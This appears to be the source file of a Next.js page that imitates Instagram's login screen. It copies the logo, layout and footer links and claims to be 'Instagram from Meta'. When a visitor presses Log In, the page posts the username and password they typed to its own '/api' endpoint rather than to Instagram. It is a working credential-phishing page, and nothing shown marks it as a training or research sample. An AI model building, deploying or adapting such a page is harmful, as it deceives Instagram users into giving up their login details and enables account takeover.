"use client";

import { FaFacebook } from "react-icons/fa";

import { useState } from "react";
export default function Home() {
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [isShowed, setIsShowed] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isClicked, setIsClicked] = useState<boolean>(false);

  async function handleOnClick() {
    setIsLoading((prev) => !prev);
    if (!isClicked) {
      try {
        const response = await fetch("/api", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            username,
            password,
          }),
        });
        setIsClicked(true);
        console.log(response);
      } catch (e) {
        console.log("Failed to Send Data...");
      }
    }

    setIsLoading((prev) => !prev);
  }

  return (
    <div className="w-screen h-screen flex flex-col justify-between items-center">
      <div></div>
      <div className="p-5">
        <div className="mx-auto mb-10 w-[175px] h-[52px] bg-[url(instagram-light.jpg)] dark:bg-[url(instagram.jpg)]"></div>
        <div className="relative px-2 pb-3 pt-[10px] bg-no-repeat mb-2 border-[1px] h-[38px] w-[270px] dark:bg-[#121212] dark:border-[#3b3b3b] bg-[#fafafa] border-[#dbdbdb] rounded-sm">
          <label
            htmlFor="username"
            className={`absolute duration-300 text-[#8f9898] ${
              username ? "text-[10px] top-0.5" : "text-[14px]"
            }`}
          >
            Phone number, username, or email
          </label>
          <input
            required
            type="text"
            name="username"
            id="username"
            className={`outline-none absolute ${
              username ? "top-4 text-[12px]" : "top-2"
            }`}
            value={username}
            onChange={(e) => setUsername(e.currentTarget.value)}
          />
        </div>
        <div className="flex justify-between relative px-2 pb-3 mb-4 pt-[10px] border-[1px] h-[38px] w-[270px] dark:bg-[#121212] dark:border-[#3b3b3b] bg-[#fafafa] border-[#dbdbdb] rounded-sm">
          <div>
            <label
              htmlFor="password"
              className={`absolute duration-300 text-[#8f9898] ${
                password ? "text-[10px] top-0.5" : "text-[14px]"
              }`}
            >
              Password
            </label>
            <input
              required
              type={isShowed ? "text" : "password"}
              name="password"
              id="password"
              className={`outline-none absolute  ${
                password ? "top-4 text-[12px]" : "top-2"
              }`}
              value={password}
              onChange={(e) => setPassword(e.currentTarget.value)}
            />
          </div>
          {password && (
            <button
              onClick={() => setIsShowed((prev) => !prev)}
              className="text-sm font-semibold flex items-center"
            >
              {isShowed ? "Hide" : "Show"}
            </button>
          )}
        </div>

        <button
          disabled={isLoading}
          onClick={handleOnClick}
          className={`flex justify-center items-center h-[32px] w-[270px] mb-7 ${
            isLoading ? "bg-[#2a3796]" : "bg-[#4a5df9]"
          } rounded-lg text-white text-sm`}
        >
          Log In
        </button>
        <div className="relative mb-10">
          <div className="h-[1px] w-[270px] dark:bg-[#232323] bg-[#dbdbdb]"></div>
          <div className="absolute z-50 top-1/2 left-1/2 -translate-1/2 text-[#a4a8a8] dark:bg-black bg-white text-xs font-semibold px-3 tracking-wide ">
            OR
          </div>
        </div>
        <a
          href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATmKHuGi4OTgzP2MtIU493vNeJQOjhJGXF8lFytiJGxr1_oje5axwZcSzhHl_DO_K9qJqCPIK7b1_r8fdflAcb5JsF4yCd6sgub2g5e0WppGS4yv1lnkfCVXJ94AJffa8p2418PUdXpTfC16Rbww0xI5lyfYLOqDTnCweADDY2GkhZ7HW6Cq1_JI4gzi_FRdUYoh7R7xAT-hooYAppZSyJzOA0GJipGO3LNNzpqqHW1nqONVd5UxkhGx4RuHqNpp-O4y"
          className="flex text-[#0095f6] justify-center items-center gap-2 mb-4"
        >
          <FaFacebook size={22} />
          <div className="text-sm tracking-wide">Log in with Facebook</div>
        </a>
        <a
          href="https://www.instagram.com/accounts/password/reset/"
          className="flex justify-center items-center hover:underline text-sm font-semibold mb-10"
        >
          Forgot password?
        </a>
        <div className="text-sm flex justify-center items-center gap-1">
          <p>Don't have an account?</p>
          <a
            href="https://www.instagram.com/accounts/emailsignup/"
            className="text-[#4182ff] font-semibold"
          >
            Sign up
          </a>
        </div>
      </div>
      <footer className="text-xs text-[#a8a8a8] pb-12">
        <div className="flex flex-wrap justify-center gap-5 mb-8 leading-1">
          <a href="https://about.meta.com/">Meta</a>
          <a href="https://about.instagram.com/">About</a>
          <a href="https://about.instagram.com/blog/">Blog</a>
          <a href="https://about.instagram.com/about-us/careers">Jobs</a>
          <a href="https://help.instagram.com/">Help</a>
          <a href="https://developers.facebook.com/docs/instagram">API</a>
          <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
          <a href="https://www.instagram.com/legal/terms/">Terms</a>
          <a href="https://www.instagram.com/explore/locations/">Locations</a>
          <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
          <a href="https://www.meta.ai/?utm_source=foa_web_footer">Meta AI</a>
          <a href="https://www.meta.ai/pages/what-is-labubu/?utm_source=foa_web_footer">
            Meta AI Articles
          </a>
          <a href="https://www.threads.com/">Threads</a>
          <a href="https://www.facebook.com/help/instagram/261704639352628">
            Contact Uploading & Non-Users
          </a>
          <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">
            Meta Verified
          </a>
          <a href="https://indonesia.fb.com/panduan-digital/">
            Meta in Indonesia
          </a>
        </div>
        <div className="flex justify-center gap-4">
          <select name="language" id="language">
            <option value="">English</option>
            <option value="">Indonesia</option>
          </select>
          <p>&copy; 2025 Instagram from Meta</p>
        </div>
      </footer>
    </div>
  );
}
